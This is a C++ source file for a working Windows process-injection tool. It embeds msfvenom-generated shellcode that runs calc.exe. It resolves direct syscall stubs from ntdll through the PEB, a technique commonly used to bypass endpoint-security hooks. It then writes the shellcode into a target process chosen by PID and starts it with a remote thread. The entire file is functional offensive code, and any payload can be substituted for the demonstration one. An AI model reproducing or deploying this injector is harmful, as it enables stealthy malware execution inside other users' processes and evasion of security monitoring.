#include <iostream>
#include <Windows.h>

#include "structs.h"

#define STATUS_SUCCESS 0

int const SYSCALL_STUB_SIZE = 23;

// msfvenom -a x64 --platform windows -p windows/x64/exec cmd=calc.exe EXITFUNC=thread -f c 
unsigned char shellcode[] =
"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52"
"\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48"
"\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9"
"\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41"
"\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48"
"\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01"
"\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48"
"\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0"
"\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c"
"\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0"
"\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04"
"\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59"
"\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48"
"\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f"
"\x87\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd\x9d\xff"
"\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb"
"\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x61\x6c"
"\x63\x2e\x65\x78\x65\x00";


MyNtOpenProcess _NtOpenProcess = NULL;
char OpenProcStub[SYSCALL_STUB_SIZE] = {};

MyNtAllocateVirtualMemory _NtAllocateVirtualMemory = NULL;
char AllocStub[SYSCALL_STUB_SIZE] = {};

MyNtWriteVirtualMemory _NtWriteVirtualMemory = NULL;
char WVMStub[SYSCALL_STUB_SIZE] = {};

MyNtProtectVirtualMemory _NtProtectVirtualMemory = NULL;
char ProtectStub[SYSCALL_STUB_SIZE] = {};

MyNtCreateThreadEx _NtCreateThreadEx = NULL;
char CreateThreadStub[SYSCALL_STUB_SIZE];

BOOL GetImageExportDirectory(PVOID pModuleBase, PIMAGE_EXPORT_DIRECTORY* ppImageExportDirectory) {
	// Get DOS header
	PIMAGE_DOS_HEADER pImageDosHeader = (PIMAGE_DOS_HEADER)pModuleBase;
	if (pImageDosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
		return FALSE;
	}

	// Get NT headers
	PIMAGE_NT_HEADERS pImageNtHeaders = (PIMAGE_NT_HEADERS)((PBYTE)pModuleBase + pImageDosHeader->e_lfanew);
	if (pImageNtHeaders->Signature != IMAGE_NT_SIGNATURE) {
		return FALSE;
	}

	// Get the EAT
	*ppImageExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)pModuleBase + pImageNtHeaders->OptionalHeader.DataDirectory[0].VirtualAddress);
	return TRUE;
}

BOOL GetStub(DWORD dwExports, PDWORD pdwAddressOfNames, PDWORD pdwAddressOfFunctions, PWORD pwAddressOfNameOrdinales, PVOID dllBase, std::string Syscall, LPVOID stub)
{
	for (size_t i = 0; i < dwExports; i++)
	{
		PCHAR pczFunctionName = (PCHAR)((PBYTE)dllBase + pdwAddressOfNames[i]);
		PVOID pFunctionAddress = (PBYTE)dllBase + pdwAddressOfFunctions[pwAddressOfNameOrdinales[i]];

		LPCSTR functionNameResolved = (LPCSTR)pczFunctionName;

		if (std::strcmp(functionNameResolved, Syscall.c_str()) == 0)
		{
			std::memcpy(stub, (LPVOID)pFunctionAddress, SYSCALL_STUB_SIZE);
			return TRUE;
		}
	}
	return FALSE;
}

BOOL FindAllocateVirtualMemory(DWORD dwExports, PDWORD pdwAddressOfNames, PDWORD pdwAddressOfFunctions, PWORD pwAddressOfNameOrdinales, PVOID dllBase)
{

	DWORD oldProtection;
	_NtAllocateVirtualMemory = (MyNtAllocateVirtualMemory)(LPVOID)AllocStub;
	BOOL status = VirtualProtect(AllocStub, SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, &oldProtection);

	if (!GetStub(dwExports, pdwAddressOfNames, pdwAddressOfFunctions, pwAddressOfNameOrdinales, dllBase, "NtAllocateVirtualMemory", AllocStub))
		return FALSE;

	return TRUE;
}

BOOL FindOpenProc(DWORD dwExports, PDWORD pdwAddressOfNames, PDWORD pdwAddressOfFunctions, PWORD pwAddressOfNameOrdinales, PVOID dllBase)
{

	DWORD oldProtection;
	_NtOpenProcess = (MyNtOpenProcess)(LPVOID)OpenProcStub;
	BOOL status = VirtualProtect(OpenProcStub, SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, &oldProtection);

	if (!GetStub(dwExports, pdwAddressOfNames, pdwAddressOfFunctions, pwAddressOfNameOrdinales, dllBase, "NtOpenProcess", OpenProcStub))
		return FALSE;

	return TRUE;
}

BOOL FindWriteVirtualMemory(DWORD dwExports, PDWORD pdwAddressOfNames, PDWORD pdwAddressOfFunctions, PWORD pwAddressOfNameOrdinales, PVOID dllBase)
{

	DWORD oldProtection;
	_NtWriteVirtualMemory = (MyNtWriteVirtualMemory)(LPVOID)WVMStub;
	BOOL status = VirtualProtect(WVMStub, SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, &oldProtection);

	if (!GetStub(dwExports, pdwAddressOfNames, pdwAddressOfFunctions, pwAddressOfNameOrdinales, dllBase, "NtWriteVirtualMemory", WVMStub))
		return FALSE;

	return TRUE;
}

BOOL FindProtectVirtualMemory(DWORD dwExports, PDWORD pdwAddressOfNames, PDWORD pdwAddressOfFunctions, PWORD pwAddressOfNameOrdinales, PVOID dllBase)
{

	DWORD oldProtection;
	_NtProtectVirtualMemory = (MyNtProtectVirtualMemory)(LPVOID)ProtectStub;
	BOOL status = VirtualProtect(ProtectStub, SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, &oldProtection);

	if (!GetStub(dwExports, pdwAddressOfNames, pdwAddressOfFunctions, pwAddressOfNameOrdinales, dllBase, "NtProtectVirtualMemory", ProtectStub))
		return FALSE;

	return TRUE;
}

BOOL FindCreateThread(DWORD dwExports, PDWORD pdwAddressOfNames, PDWORD pdwAddressOfFunctions, PWORD pwAddressOfNameOrdinales, PVOID dllBase)
{

	DWORD oldProtection;
	_NtCreateThreadEx = (MyNtCreateThreadEx)(LPVOID)CreateThreadStub;
	BOOL status = VirtualProtect(CreateThreadStub, SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, &oldProtection);

	if (!GetStub(dwExports, pdwAddressOfNames, pdwAddressOfFunctions, pwAddressOfNameOrdinales, dllBase, "NtCreateThreadEx", CreateThreadStub))
		return FALSE;

	return TRUE;
}

HANDLE CallOpenProc(DWORD pid)
{
	// variables for NtOpenProcess
	HANDLE hProcess = NULL;
	OBJECT_ATTRIBUTES zoa;
	InitializeObjectAttributes(&zoa, NULL, NULL, NULL, NULL, NULL);
	CLIENT_ID targetPid = { 0 };
	targetPid.UniqueProcess = (void*)pid;
	NTSTATUS success = NULL;
	success = _NtOpenProcess(&hProcess, MAXIMUM_ALLOWED, &zoa, &targetPid);
	if (success != 0)
		return NULL;

	return hProcess;
}


BOOL EstablishSyscalls()
{

	PTEB pCurrentTeb = (PTEB)__readgsqword(0x30); 	//x64 only

	PPEB pCurrentPeb = pCurrentTeb->ProcessEnvironmentBlock;
	if (!pCurrentPeb || !pCurrentTeb)
		return 1;

	// Get NTDLL module 
	PLDR_DATA_TABLE_ENTRY pLdrDataEntry = (PLDR_DATA_TABLE_ENTRY)((PBYTE)pCurrentPeb->LoaderData->InMemoryOrderModuleList.Flink->Flink - 0x10);
	auto name = pLdrDataEntry->BaseDllName;

	//Make sure it is ntdll
	if (!_wcsnicmp(name.Buffer, L"ntdll.dll", 10) == 0)
	{
		printf("Didn't find ntdll.dll");
		return FALSE;
	}


	// Get the EAT of NTDLL
	PIMAGE_EXPORT_DIRECTORY pImageExportDirectory = NULL;
	if (!GetImageExportDirectory(pLdrDataEntry->DllBase, &pImageExportDirectory) || pImageExportDirectory == NULL)
		return FALSE;

	PDWORD pdwAddressOfFunctions = (PDWORD)((PBYTE)pLdrDataEntry->DllBase + pImageExportDirectory->AddressOfFunctions);
	PDWORD pdwAddressOfNames = (PDWORD)((PBYTE)pLdrDataEntry->DllBase + pImageExportDirectory->AddressOfNames);
	PWORD pwAddressOfNameOrdinales = (PWORD)((PBYTE)pLdrDataEntry->DllBase + pImageExportDirectory->AddressOfNameOrdinals);

	if (!FindOpenProc(pImageExportDirectory->NumberOfNames, pdwAddressOfNames, pdwAddressOfFunctions, pwAddressOfNameOrdinales, pLdrDataEntry->DllBase))
	{
		printf("Can't find NtOpenProcess");
		return FALSE;
	}
	if (!FindAllocateVirtualMemory(pImageExportDirectory->NumberOfNames, pdwAddressOfNames, pdwAddressOfFunctions, pwAddressOfNameOrdinales, pLdrDataEntry->DllBase))
	{
		printf("Can't find NtAllocateVirtualMemory");
		return FALSE;
	}
	if (!FindWriteVirtualMemory(pImageExportDirectory->NumberOfNames, pdwAddressOfNames, pdwAddressOfFunctions, pwAddressOfNameOrdinales, pLdrDataEntry->DllBase))
	{
		printf("Can't find NtWriteVirtualMemory");
		return FALSE;
	}
	if (!FindProtectVirtualMemory(pImageExportDirectory->NumberOfNames, pdwAddressOfNames, pdwAddressOfFunctions, pwAddressOfNameOrdinales, pLdrDataEntry->DllBase))
	{
		printf("Can't find NtProtectVirtualMemory");
		return FALSE;
	}
	if (!FindCreateThread(pImageExportDirectory->NumberOfNames, pdwAddressOfNames, pdwAddressOfFunctions, pwAddressOfNameOrdinales, pLdrDataEntry->DllBase))
	{
		printf("Can't find NtCreateThreadEx");
		return FALSE;
	}


	return TRUE;

}



int main(int argc, char* argv[])
{
	HANDLE hProc = INVALID_HANDLE_VALUE;
	HANDLE hRemoteThread = INVALID_HANDLE_VALUE;
	LPVOID lpAllocationStart = nullptr;
	SIZE_T szAllocation = sizeof shellcode;
	DWORD oldProtect;

	if (argc < 2)
	{
		printf("Enter target PID");
		return 1;

	}
	DWORD targetPid = std::atoi(argv[1]);

	BOOL localNtDll = TRUE;



	printf("Opening target process with PID %d\n", targetPid);
	hProc = CallOpenProc(targetPid);
	if (hProc == INVALID_HANDLE_VALUE) {
		printf("Failed to open target process\n");
		return FALSE;
	}

	printf("Allocating %d bytes\n", szAllocation);
	NTSTATUS status = _NtAllocateVirtualMemory(hProc, &lpAllocationStart, 0, &szAllocation, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (status != STATUS_SUCCESS)
	{
		printf("Failed to allocate memory\n");
		return FALSE;
	}

	printf("Writing shellcode to 0x%p\n", lpAllocationStart);
	status = _NtWriteVirtualMemory(hProc, lpAllocationStart, (PVOID)shellcode, sizeof shellcode, NULL);
	if (status != STATUS_SUCCESS)
	{
		printf("Failed to write to allocated memory\n");
		return FALSE;
	}

	printf("Changing memory permissions\n");
	status = _NtProtectVirtualMemory(hProc, &lpAllocationStart, &szAllocation, PAGE_EXECUTE_READ, &oldProtect);
	if (status != STATUS_SUCCESS)
	{
		printf("Unable to change memory permissions\n");
		return FALSE;
	}

	printf("Creating remote thread\n");
	status = _NtCreateThreadEx(&hRemoteThread, 0x1FFFFF, NULL, hProc,
		(LPTHREAD_START_ROUTINE)lpAllocationStart, NULL, FALSE, 0, 0, 0, NULL);


	if (hRemoteThread)
		CloseHandle(hRemoteThread);
	if (hProc)
		CloseHandle(hProc);

	if (status != STATUS_SUCCESS)
	{
		printf("CreateRemoteThread failed\n");
		return FALSE;
	}


	printf("Success!");
	return 0;
}

